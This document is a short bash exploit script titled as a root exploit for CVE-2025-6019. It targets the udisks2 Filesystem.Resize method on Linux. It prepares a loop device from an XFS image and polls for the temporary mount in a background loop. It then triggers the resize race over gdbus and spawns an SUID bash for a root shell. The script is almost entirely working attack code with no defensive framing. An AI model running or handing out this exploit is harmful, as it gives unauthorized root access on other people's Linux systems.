#!/bin/bash
# Remote Root Exploit (CVE-2025-6019)

IMAGE_PATH="/tmp/xfs_real.image"

echo "[*] Killing existing volume monitors..."
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null

echo "[*] Setting up loop device..."
# Capture the loop device name (e.g., /dev/loop5)
LOOP_DEV=$(udisksctl loop-setup --file $IMAGE_PATH --no-user-interaction | grep -o '/dev/loop[0-9]*')

if [ -z "$LOOP_DEV" ]; then
    echo "[-] Failed to setup loop device. Is CVE-2025-6018 active?"
    exit 1
fi

echo "[+] Mapped to $LOOP_DEV"

# Get the object path for gdbus (e.g., /org/freedesktop/UDisks2/block_devices/loop5)
OBJ_PATH="/org/freedesktop/UDisks2/block_devices/$(basename $LOOP_DEV)"

echo "[*] Starting background monitor for mount point..."
# This looks for the temporary directory udisks2 creates during the resize/mount race
while true; do 
    /tmp/blockdev*/bash -c 'ls -l /tmp/blockdev*/bash' && break
done 2>/dev/null &

echo "[*] Triggering XFS Resize Race..."
# The vulnerability: Resize forces a mount without 'nosuid' if the session is active
gdbus call --system --dest org.freedesktop.UDisks2 --object-path $OBJ_PATH --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

echo "[!] Exploit finished. Checking for SUID shell..."
sleep 2
/tmp/blockdev*/bash -p
